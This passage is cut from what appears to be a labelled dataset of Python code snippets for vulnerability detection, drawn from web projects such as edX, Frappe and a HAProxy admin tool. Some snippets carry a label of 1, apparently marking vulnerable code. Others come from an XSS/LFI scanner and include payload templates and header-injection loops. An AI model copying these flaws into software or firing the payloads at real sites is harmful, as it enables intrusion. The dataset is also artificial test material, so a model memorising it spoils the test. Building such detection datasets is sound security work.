User from django.contrib", "label": 0}, {"snippet_id": 43555, "code": " field(or get global default). \t\t:param fieldname: Fieldname for which precision is required. \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t", "label": 0}, {"snippet_id": 28694, "code": "): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_id=cookie.get('uuid') \ttry: \t\trole=sql.get_user_role_by_uuid(user_id.value) \texcept: \t\trole=3 ", "label": 0}, {"snippet_id": 37796, "code": ".comment_text=_('{0} comments').format(str(post.comments)) \t\tpost.avatar=post.avatar or \"\" \t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) ", "label": 0}, {"snippet_id": 10865, "code": " self.testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org", "label": 0}, {"snippet_id": 5312, "code": "'kbd', 'keygen', 'label', 'layer', 'legend', 'li', 'link', 'listing', 'main', 'map', 'mark', 'marquee', 'menu', 'menuitem', 'meta', 'meter', 'multicol', 'nav', 'nobr', 'noembed', 'noframes', 'nolayer', ", "label": 0}, {"snippet_id": 19110, "code": ".easy import BuildFailure from pavelib.utils.test.suites import BokChoyTestSuite, Pa11yCrawler REPO_DIR=os.getcwd() class TestPaverBokChoyCmd(unittest.TestCase): \"\"\" Paver Bok Choy Command test cases \"\"", "label": 0}, {"snippet_id": 2716, "code": "{ \"id\": 11, \"scanid\": scanid, \"url\": url, \"alert\": \"Cross Site Scripting via referer header\", \"impact\": impact, \"req_headers\": temp_headers, \"req_body\":body, \"res_headers\": ref_header_xss.headers,\"res_body", "label": 0}, {"snippet_id": 42111, "code": " \t\t\t\tcontinue \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif df: \t\t\t\tif df.fieldtype==\"Check\": \t\t\t\t\tif d[fieldname]==None: \t\t\t\t\t\td[fieldname]=0 \t\t\t\t\telif(not isinstance(d[fieldname], int) or d[fieldname] >", "label": 0}, {"snippet_id": 43563, "code": ". \t\t:param parentfield: If fieldname is in child table.\"\"\" \t\tfrom frappe.model.meta import get_field_precision \t\tif parentfield and not isinstance(parentfield, string_types): \t\t\tparentfield=parentfield", "label": 0}, {"snippet_id": 36707, "code": "\t\t\traise Exception(\"This blog has not been published yet!\") \t\t \t\tcontext.full_name=get_fullname(self.owner) \t\tcontext.updated=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info", "label": 0}, {"snippet_id": 42241, "code": "\t\t\t\tself.__dict__[key]=0 \t\tfor key in self.get_valid_columns(): \t\t\tif key not in self.__dict__: \t\t\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns", "label": 0}, {"snippet_id": 25334, "code": " widget_value=None if id_: final_attrs=dict( final_attrs, id='%s_%s' %(id_, i), title=self.scheme['fields'][i][1], placeholder=self.scheme['fields'][i][1], ) final_attrs['data-size']=self.scheme['fields']", "label": 0}, {"snippet_id": 2030, "code": " headers, \"req_body\":body, \"res_headers\": host_header_xss.headers,\"res_body\": host_header_xss.text} dbupdate.insert_record(attack_result) break for payload in xss_payloads: referer_header_value='http:/", "label": 0}, {"snippet_id": 49138, "code": ".get_url_with_query_params({ self.ordering_query_param: self.column_id }) elif self.current_columns_length > 1: new_query=[] for column in self.query_order.split('.'): c=column.replace(\"-\", \"\") if not int(c)=", "label": 0}, {"snippet_id": 49566, "code": "(object): def __init__(self, object_list, query_params=None, list_display=None, list_filter=None, list_search=None, search_query_param=None, ordering_query_param=None): self.object_list=object_list self", "label": 0}, {"snippet_id": 36741, "code": " self.title, \t\t\t\"description\": context.description, \t\t} \t\tif \"<!--markdown -->\" in context.content: \t\t\tcontext.content=markdown(context.content) \t\timage=find_first_image(self.content) \t\tif image: \t\t\tcontext", "label": 0}, {"snippet_id": 37423, "code": "\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext.parents=[{\"name\": _(\"Home\"), \"route\":\"/\"}, \t\t\t{\"name\": \"Blog\", \"route\": \"/blog\"}, \t\t\t{\"label\": context.category.title", "label": 0}, {"snippet_id": 50988, "code": " schedule does not support due_ or something. Which is absolutely terrible and vague. I can't understand why there is not an is_due() for each type of schedule. This makes it very hazy when something will", "label": 0}, {"snippet_id": 41608, "code": ": \t\"\"\"Returns the **class** object of the given DocType. \tFor `custom` type, returns `frappe.model.document.Document`. \t:param doctype: DocType name as string.\"\"\" \tfrom frappe.model.document import Document", "label": 0}, {"snippet_id": 42347, "code": " list(doc): \t\t\t\tif k in default_fields: \t\t\t\t\tdel doc[k] \t\tfor key in(\"_user_tags\", \"__islocal\", \"__onload\", \"_liked_by\", \"__run_link_triggers\"): \t\t\tif self.get(key): \t\t\t\tdoc[key]=self.get(key) \t\treturn doc", "label": 0}, {"snippet_id": 25468, "code": ".scheme['fields']: defaults['label']=label field=forms.CharField(**defaults) field.part_name=fname fields.append(field) super().__init__( fields=fields, require_all_fields=False, *args, **kwargs ) self", "label": 0}, {"snippet_id": 11364, "code": ") def __enter__(self): if self.should_fetch_course: self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p(", "label": 0}, {"snippet_id": 9150, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views", "label": 1}, {"snippet_id": 19672, "code": "\"\"\" Class used for defining and running Bok Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError", "label": 0}, {"snippet_id": 13273, "code": ", kwargs={'org_id': 'TorontoX'}), url(r'^(?i)university_profile/RiceX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'RiceX'}), url(r'^(?i)university_profile", "label": 0}, {"snippet_id": 28739, "code": "\"level\") \t\t \tif not is_admin(level=give_level): \t\tprint('<center><h3 style=\"color: red\">How did you get here?! O_o You do not have need permissions</h>') \t\tprint('<meta http-equiv=\"refresh\" content=\"5;", "label": 1}, {"snippet_id": 41834, "code": "=_filter(self.__dict__.get(key,[]), filters, limit=limit) \t\t\t\telse: \t\t\t\t\tdefault=filters \t\t\t\t\tfilters=None \t\t\t\t\tvalue=self.__dict__.get(key, default) \t\t\telse: \t\t\t\tvalue=self.__dict__.get(key, default) ", "label": 0}, {"snippet_id": 21135, "code": "\"user_software_license\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/xqueue/(?P<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback", "label": 0}, {"snippet_id": 6986, "code": "=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request', name=\"change_name\"), url(r'^accept_name_change$", "label": 0}, {"snippet_id": 33383, "code": "-export-prod', bq.CronExportBuildsProd), webapp2.Route(r'/internal/cron/buildbucket/bq-export-experimental', bq.CronExportBuildsExperimental), webapp2.Route(r'/internal/cron/buildbucket/unregister-builders'", "label": 0}, {"snippet_id": 31679, "code": "=800, plot_height=250, toolbar_location=\"left\", toolbar_options=dict(logo=None)) \tshow(grid) \t if form.getvalue('get_hap_v'): \toutput=funct.check_haproxy_version(serv) \tprint(output) \t if form.getvalue", "label": 0}, {"snippet_id": 11803, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r", "label": 0}, {"snippet_id": 37647, "code": " % frappe.db.escape(filters.blogger)) \t\tif filters.blog_category: \t\t\tconditions.append('t1.blog_category=\"%s\"' % frappe.db.escape(filters.blog_category)) \tif txt: \t\tconditions.append('(t1.content like ", "label": 0}, {"snippet_id": 49996, "code": " import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils.mod_import(settings.SESSION_ENGINE).SessionStore", "label": 0}, {"snippet_id": 52529, "code": " '{}')) copied_properties=json.loads(request.POST.get('copiedProperties', '{}')) _properties=dict(NODES[node['widgetType']].get_fields()) _properties.update(dict([(_property['name'], _property['value']", "label": 0}, {"snippet_id": 50669, "code": ") if csession: csession[\"webclient_authenticated_uid\"]=None csession.save() self.logged_in=False self.client.lineSend(self.csessid,[\"connection_close\",[reason],{}]) self.client.client_disconnect(self.csessid", "label": 0}, {"snippet_id": 4755, "code": "', 'onselectionchange', 'onselectstart', 'onstalled', 'onstorage', 'onsubmit', 'onsuspend', 'ontimeupdate', 'ontoggle', 'ontouchcancel', 'ontouchend', 'ontouchmove', 'ontouchstart', 'ontransitionend', ", "label": 0}, {"snippet_id": 34738, "code": "(d[fieldname], list) and df.fieldtype !='Table': \t\t\t\t\tfrappe.throw(_('Value for{0} cannot be a list').format(_(df.label))) \t\t\t\tif convert_dates_to_str and isinstance(d[fieldname],(datetime.datetime, datetime", "label": 0}, {"snippet_id": 21224, "code": " 'courseware.views.course_info', name=\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]", "label": 0}, {"snippet_id": 1322, "code": " are \",records if records: for data in records: print \"Data is\",data if data['req_body']==None: data['req_body']=\"NA\" data.pop('_id') try: data= ast.literal_eval(json.dumps(data)) except: print \"Falied to", "label": 0}, {"snippet_id": 35955, "code": "\"Small Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t", "label": 1}, {"snippet_id": 5805, "code": "&rpar;&gt;\" />', ] class XSS(Fuzzer): \"\"\"generate XSS payload\"\"\" tags=_tags events=_events htmlTemplate=_htmlTemplate probes=_probes payloads=_payloads waf_payloads=_waf_payloads h5payloads=_h5payloads", "label": 0}, {"snippet_id": 35033, "code": "\t\t\t\t\t\treturn \t\t\t\t\traise frappe.DuplicateEntryError(self.doctype, self.name, e) \t\t\t\telif \"Duplicate\" in cstr(e.args[1]): \t\t\t\t\t \t\t\t\t\tself.show_unique_validation_message(e) \t\t\t\telse: \t\t\t\t\traise \t\t\telse: \t", "label": 0}, {"snippet_id": 32734, "code": " self._WriteHeader('text/html') self._WriteTemplate('header.html') self.wfile.write('<table class=\"FileContents\">') with open(full_path) as fp: data=fp.read().replace( '&', '&amp;').replace( '<', '&lt;", "label": 0}, {"snippet_id": 37573, "code": " name, \t\ttitle from `tabBlog Category` \t\twhere published=1 \t\tand exists(select name from `tabBlog Post` \t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc", "label": 0}, {"snippet_id": 2054, "code": "} temp_headers.update(referer_header) ref_header_xss=req.api_request(url, \"GET\", temp_headers) decoded_payload=xss_payload_decode(payload) if ref_header_xss.text.find(decoded_payload) !=-1: print ref_header_xss", "label": 0}, {"snippet_id": 2837, "code": "(decoded_payload) !=-1: impact=check_xss_impact(xss_request_uri.headers) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G, api_logger.W) attack_result={ \"id\": 11, \"scanid\": scanid, \"url\":", "label": 0}, {"snippet_id": 26085, "code": ".settings.invoice_address_company_required and not self.all_optional: self.initial['is_business']=True self.fields['is_business'].widget=BusinessBooleanRadio(require_business=True) self.fields['company'", "label": 0}, {"snippet_id": 18294, "code": "[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter/(?P<chapter>[^/]*)/$', 'staticbook.views.pdf_index', name=\"pdf_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/pdfbook/(?P<book_index>[^/]*)/chapter", "label": 1}, {"snippet_id": 52777, "code": "=_submit_workflow(request.user, request.fs, request.jt, workflow, mapping) request.info(_('Workflow submitted')) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) else: request.error(_", "label": 0}, {"snippet_id": 40179, "code": " key in self.as_dict(): \t\t\tdf=self.meta.get_field(key) \t\t\tdb_value=db_values.get(key) \t\t\tif df and not df.allow_on_submit and(self.get(key) or db_value): \t\t\t\tif df.fieldtype==\"Table\": \t\t\t\t\t \t\t\t\t\t \t\t\t\t\tself_value", "label": 0}, {"snippet_id": 44634, "code": "'doc1_id']=workflow_doc.doc.get().id response['message']=_('Page saved !') return HttpResponse(json.dumps(response), mimetype=\"application/json\") def new_node(request): response={'status': -1} node=json.loads", "label": 0}, {"snippet_id": 3552, "code": " decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable", "label": 0}, {"snippet_id": 32747, "code": "'&', '&amp;').replace( '<', '&lt;').replace( '>', '&gt;').replace( '\"', '&quot;') for i, line in enumerate(data.splitlines(), start=1): self.wfile.write( ('<tr class=\"u-pre u-monospace FileContents-line", "label": 0}, {"snippet_id": 33219, "code": " self.abort(400) build=model.Build.get_by_id(build_id) can_view=build and user.can_view_build_async(build).get_result() if not can_view: if auth.get_current_identity().is_anonymous: return self.redirect", "label": 1}, {"snippet_id": 3154, "code": " xss_post_request=req.api_request(url, \"POST\", headers, temp_body) decoded_payload=xss_payload_decode(payload) if xss_post_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_post_request", "label": 0}, {"snippet_id": 21617, "code": "'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 16937, "code": "/[^/]+/[^/]+)/gradebook$', 'instructor.views.gradebook', name='gradebook'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/grade_summary$', 'instructor.views.grade_summary', name='grade_summary'), url", "label": 0}, {"snippet_id": 8481, "code": "'), url(r'^$', 'branding.views.index', name=\"root\"), url(r'^dashboard$', 'student.views.dashboard', name=\"dashboard\"), url(r'^login$', 'student.views.signin_user', name=\"signin_user\"), url(r'^register$", "label": 0}, {"snippet_id": 52133, "code": "(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json.dumps(workflow_data['layout']), 'workflow_json': json.dumps(workflow_data['workflow']), 'credentials_json': json", "label": 1}, {"snippet_id": 38747, "code": ".__dict__.get(key, default) \t\t\tif value is None and key not in self.ignore_in_getter \\ \t\t\t\tand key in(d.fieldname for d in self.meta.get_table_fields()): \t\t\t\tself.set(key,[]) \t\t\t\tvalue=self.__dict__.get(key", "label": 0}, {"snippet_id": 13069, "code": "), url(r'^change_email$', 'student.views.change_email_request', name=\"change_email\"), url(r'^email_confirm/(?P<key>[^/]*)$', 'student.views.confirm_email_change'), url(r'^change_name$', 'student.views.change_name_request", "label": 0}, {"snippet_id": 34195, "code": ") \\ \t\t\tor[\"Core\", False] \t\tif custom: \t\t\t_class=Document \t\telse: \t\t\tmodule=load_doctype_module(doctype, module_name) \t\t\tclassname=doctype.replace(\" \", \"\").replace(\"-\", \"\") \t\t\tif hasattr(module, classname", "label": 0}, {"snippet_id": 22720, "code": "/about$', 'courseware.views.course_about', name=\"about_course\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/mktg-about$', 'courseware.views.mktg_course_about', name=\"mktg_about_course\"), url(r'^mktg", "label": 0}, {"snippet_id": 37187, "code": "\t\tpost.category=frappe.db.get_value('Blog Category', post.blog_category, \t\t\t['route', 'title'], as_dict=True) \t\tif post.avatar and(not \"http:\" in post.avatar and not \"https:\" in post.avatar) and not post", "label": 0}, {"snippet_id": 43047, "code": "\t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and value.startswith(\"_T-\")): \t\t\t\t \t\t\t\tprefix=_(\"Row", "label": 0}, {"snippet_id": 27013, "code": "\")==0: furl=\"https://\" +host +\"/\" +page else: furl=\"http://\" +host +\"/\" +page print \"[+] LFI check for: \" +furl if DEBUG==1: print \"Params: \" print params print hidden_param_name print hidden_param_value", "label": 0}, {"snippet_id": 49329, "code": "(field) and getattr(field, 'alters_data', False): raise SmartListException(\"Cannot use a function that alters data in smart list\") except AttributeError: self.order_field=self.field_name pass if self.order_field", "label": 0}, {"snippet_id": 17960, "code": ".simple.redirect_to',{'url': '/static/images/favicon.ico'}), url(r'^submit_feedback$', 'util.views.submit_feedback'), ) for key, value in settings.MKTG_URL_LINK_MAP.items(): if value is None: continue if", "label": 0}, {"snippet_id": 9503, "code": "\"list_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^", "label": 0}, {"snippet_id": 33722, "code": ".category.route}] def get_list_context(context=None): \tlist_context=frappe._dict( \t\ttemplate=\"templates/includes/blog/blog.html\", \t\tget_list=get_blog_list, \t\thide_filters=True, \t\tchildren=get_children(),", "label": 0}, {"snippet_id": 29177, "code": " error: \t\tprint('error: '+error) \tos.system(\"rm -f %s\" % script) \t \tstderr=ssh_command(serv, commands, print_out=\"1\") \tif stderr is None: \t\tsql.insert_waf_metrics_enable(serv, \"0\") def check_haproxy_version", "label": 0}, {"snippet_id": 4561, "code": ", 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'command', 'content', 'data', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'div', 'dl', 'dt', 'element', 'em', 'embed'", "label": 0}, {"snippet_id": 17896, "code": "(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r'^media-kit$', 'static_template_view.views.render', {", "label": 0}, {"snippet_id": 41336, "code": "(published,0)=1\"\"\"): \t\tclear_cache(blog) \tclear_cache(\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt", "label": 0}, {"snippet_id": 31922, "code": "(server[2],[\"sudo \" +sql.get_setting('restart_command')]) \t\t\t if form.getvalue('get_lists'): \tlist=os.path.dirname(os.getcwd())+\"/\"+sql.get_setting('lists_path')+\"/\"+form.getvalue('group')+\"/\"+form.getvalue", "label": 0}, {"snippet_id": 18663, "code": "<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/peer_grading$", "label": 0}, {"snippet_id": 27465, "code": " '..', 'templates')), extensions=['jinja2.ext.autoescape'], autoescape=True) _MENU_ITEMS=[] add_jinja2_filter('json', encode_json) add_jinja2_filter('format_time', format_time) add_jinja2_filter('splitlines", "label": 0}, {"snippet_id": 28503, "code": "\telif kwargs.get('metrics')==1: \t\tmess=get_data('date_in_log') +action +\"\\n\" \t\tlog=open(log_path +\"/metrics-\"+get_data('logs')+\".log\", \"a\") \telif kwargs.get('keep_alive')==1: \t\tmess=get_data('date_in_log", "label": 0}, {"snippet_id": 18855, "code": "=( url(r'^course_specific_login/(?P<course_id>[^/]+/[^/]+/[^/]+)/$', 'external_auth.views.course_specific_login', name='course-specific-login'), url(r'^course_specific_register/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 43040, "code": "\tif not filter(None, options): \t\t\t\tcontinue \t\t\t \t\t\tself.set(df.fieldname, cstr(self.get(df.fieldname)).strip()) \t\t\tvalue=self.get(df.fieldname) \t\t\tif value not in options and not(frappe.flags.in_test and", "label": 0}, {"snippet_id": 34237, "code": "\t\t\telse: \t\t\t\traise ImportError(doctype) \t\t_classes[doctype]=_class \treturn _classes[doctype] class BaseDocument(object): \tignore_in_getter=(\"doctype\", \"_meta\", \"meta\", \"_table_fields\", \"_valid_columns\"", "label": 0}, {"snippet_id": 78, "code": ",method,headers,body,scanid=None): result='' url_query=urlparse.urlparse(url) parsed_query=urlparse.parse_qs(url_query.query) if parsed_query: for key,value in parsed_query.items(): try: logs.logging.info(", "label": 0}, {"snippet_id": 9713, "code": ".openid_login_complete', name='openid-complete'), url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login", "label": 0}, {"snippet_id": 13462, "code": "),) if settings.WIKI_ENABLED: from wiki.urls import get_pattern as wiki_pattern from django_notify.urls import get_pattern as notify_pattern urlpatterns +=( url('^wiki/create-root/$', 'course_wiki.views", "label": 0}, {"snippet_id": 50439, "code": " Incoming request. \"\"\" csessid=request.args.get('csessid')[0] self.last_alive[csessid]=(time.time(), False) dataentries=self.databuffer.get(csessid,[]) if dataentries: return dataentries.pop(0) request", "label": 0}, {"snippet_id": 167, "code": "?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if uri_list in url: parsed_url=urlparse.urlparse(url).scheme+\"://\"+urlparse.urlparse(url).netloc+urlparse.urlparse(url).path break if parsed_url", "label": 0}, {"snippet_id": 25820, "code": ") elif q.type==Question.TYPE_FILE: field=forms.FileField( label=q.question, required=q.required, help_text=help_text, initial=initial.file if initial else None, widget=UploadedFileWidget(position=pos, event", "label": 0}, {"snippet_id": 10564, "code": " Choy acceptance test suite \"\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver", "label": 0}, {"snippet_id": 44711, "code": ".objects.get_docs(user, Document2, extra='workflow2')] ] def add_node(request): response={'status': -1} node=json.loads(request.POST.get('node', '{}')) properties=json.loads(request.POST.get('properties', '", "label": 0}, {"snippet_id": 24867, "code": " string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd=[ \"DEFAULT_STORE={}\".format(self.default_store), \"SCREENSHOT_DIR=", "label": 0}, {"snippet_id": 46998, "code": "): cids=[c.id for c in await self.comments] if not cids: return[] queryset=await ReactItem.filter( Q(user_id=user_id), Q(target_id__in=cids), Q(target_kind=K_COMMENT)) return[item.target_id for item in", "label": 0}, {"snippet_id": 28755, "code": "') \t\tprint('<meta http-equiv=\"refresh\" content=\"5; url=/\">') \t\timport sys \t\tsys.exit() \t\t\t\t def ssh_connect(serv, **kwargs): \timport paramiko \tfrom paramiko import SSHClient \timport sql \tfullpath=get_config_var", "label": 0}, {"snippet_id": 621, "code": ".text.find(payload) !=-1: impact=check_xss_impact(xss_request_url.headers) xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload", "label": 1}, {"snippet_id": 14921, "code": " suite=BokChoyTestSuite('', num_processes=process_count) self.assertEqual(BokChoyTestSuite.verbosity_processes_string(suite), expected_verbosity_string) def test_verbosity_settings_3_processes(self): \"", "label": 0}, {"snippet_id": 22683, "code": ".module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url(r'^calculate$', 'util.views.calculate'), url(r'^courses/?$',", "label": 0}, {"snippet_id": 10568, "code": "\"\" from time import sleep from urllib import urlencode from common.test.acceptance.fixtures.course import CourseFixture, FixtureError from path import Path as path from paver.easy import sh, BuildFailure", "label": 0}, {"snippet_id": 50838, "code": ") cmd=\"prompt\" if prompt else \"text\" if raw: args[0]=text else: args[0]=parse_html(text, strip_ansi=nocolor) self.client.lineSend(self.csessid,[cmd, args, kwargs]) def send_prompt(self, *args, **kwargs", "label": 0}, {"snippet_id": 33576, "code": " count(*) from `tabBlog Post` \t\t\twhere ifnull(blogger,'')=tabBlogger.name) \t\t\twhere name=%s\"\"\",(self.blogger,)) \tdef on_update(self): \t\tclear_cache(\"writers\") \tdef get_context(self, context): \t\t \t\tif not", "label": 0}, {"snippet_id": 19143, "code": "\"DEFAULT_STORE={default_store} \" \"SCREENSHOT_DIR='{repo_dir}/test_root/log{shard_str}' \" \"BOK_CHOY_HAR_DIR='{repo_dir}/test_root/log{shard_str}/hars' \" \"BOKCHOY_A11Y_CUSTOM_RULES_FILE='{repo_dir}/{a11y_custom_file", "label": 0}, {"snippet_id": 29517, "code": "+escape_html(line) +'</div>') \t\t\t def show_ip(stdout): \tfor line in stdout: \t\tprint(line) \t\t def server_status(stdout):\t \tproc_count=\"\" \t \tfor line in stdout: \t\tif \"Ncat: \" not in line: \t\t\tfor k in line", "label": 0}, {"snippet_id": 45923, "code": " search.conf import LATEST from dashboard.dashboard_api import get_engine from dashboard.decorators import allow_owner_only from dashboard.models import Collection2 from dashboard.conf import get_engines", "label": 0}, {"snippet_id": 7980, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/add$', 'course_groups.views.add_users_to_cohort', name=\"add_to_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 52368, "code": ", type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description, extra='workflow2') subworkflows", "label": 0}, {"snippet_id": 40803, "code": ", df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager import extract_images_from_doc \t\tif self.doctype !=\"DocType\": \t\t\tfor df", "label": 0}, {"snippet_id": 30301, "code": " None and act==\"stats\": \timport requests \tfrom requests_toolbelt.utils import dump \t \thaproxy_user=sql.get_setting('stats_user') \thaproxy_pass=sql.get_setting('stats_password') \tstats_port=sql.get_setting(", "label": 0}, {"snippet_id": 53407, "code": " new_bundle(request): return edit_bundle(request) @check_document_modify_permission() def save_bundle(request): response={'status': -1} bundle_data=json.loads(request.POST.get('bundle', '{}')) if bundle_data.get", "label": 0}, {"snippet_id": 42985, "code": "\t\tand(is_submittable or self.meta.is_submittable) and frappe.get_meta(doctype).is_submittable \t\t\t\t\t\tand cint(frappe.db.get_value(doctype, docname, \"docstatus\"))==2): \t\t\t\t\t\tcancelled_links.append((df.fieldname", "label": 0}, {"snippet_id": 11367, "code": " self.get_test_course() super(Pa11yCrawler, self).__enter__() def get_test_course(self): \"\"\" Fetches the test course. \"\"\" self.imports_dir.makedirs_p() zipped_course=self.imports_dir +'demo_course.tar.gz", "label": 0}, {"snippet_id": 27090, "code": "\" % str(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=[] hidden_param_value=[] page=\"\" form_counter=0 try: with", "label": 1}, {"snippet_id": 4314, "code": " img(self): payload=\"<img src='%s'></img>\" % self.url return payload def script(self): payload=\"<script src='%s'></script>\" % self.url return payload def event(self, element, src, event, js): payload=\"<", "label": 1}, {"snippet_id": 52362, "code": "=workflow['name'], uuid=workflow['uuid'], type='oozie-workflow2', owner=request.user) Document.objects.link(workflow_doc, owner=workflow_doc.owner, name=workflow_doc.name, description=workflow_doc.description,", "label": 0}, {"snippet_id": 11188, "code": ". If nosetests aren't being run, the command returns an empty string. \"\"\" if not self.test_spec: test_spec=self.test_dir else: test_spec=self.test_dir / self.test_spec if self.serversonly: return \"\" cmd", "label": 0}, {"snippet_id": 15591, "code": ".load_courses() msg=colorize('green', \"Confirming servers are running...\") print msg bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self", "label": 0}, {"snippet_id": 33134, "code": " import swarming import user README_MD=( 'https://chromium.googlesource.com/infra/infra/+/master/' 'appengine/cr-buildbucket/README.md' ) class MainHandler(webapp2.RequestHandler): \"\"\"Redirects to README.md.", "label": 0}, {"snippet_id": 34608, "code": "=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, \"name\", None): \t\t\tvalue.__dict__['__islocal'", "label": 0}, {"snippet_id": 48304, "code": ") if current_reservation.createdByUser !=u and u.rights < 2: return HttpResponseRedirect(\"/admin?error=noyb\") if current_reservation.submitted==True: return HttpResponseRedirect(\"/admin?error=Already%20submitted", "label": 0}, {"snippet_id": 40080, "code": " in iteritems(self.get_valid_dict()): \t\t\tdf=self.meta.get_field(fieldname) \t\t\tif not df or df.fieldtype=='Check': \t\t\t\t \t\t\t\tcontinue \t\t\tcolumn_type=type_map[df.fieldtype][0] or None \t\t\tdefault_column_max_length", "label": 0}, {"snippet_id": 23534, "code": ", 'lms_migration.migrate.gitreload'), url(r'^gitreload/(?P<reload_dir>[^/]+)$', 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$", "label": 0}, {"snippet_id": 29852, "code": "\"alert alert-danger\" style=\"margin:0\">Can not connect to the server</div>') if form.getvalue('checkSshConnect') is not None and serv is not None: \ttry: \t\tfunct.ssh_command(serv,[\"ls -1t\"]) \texcept: \t\tprint", "label": 0}, {"snippet_id": 33713, 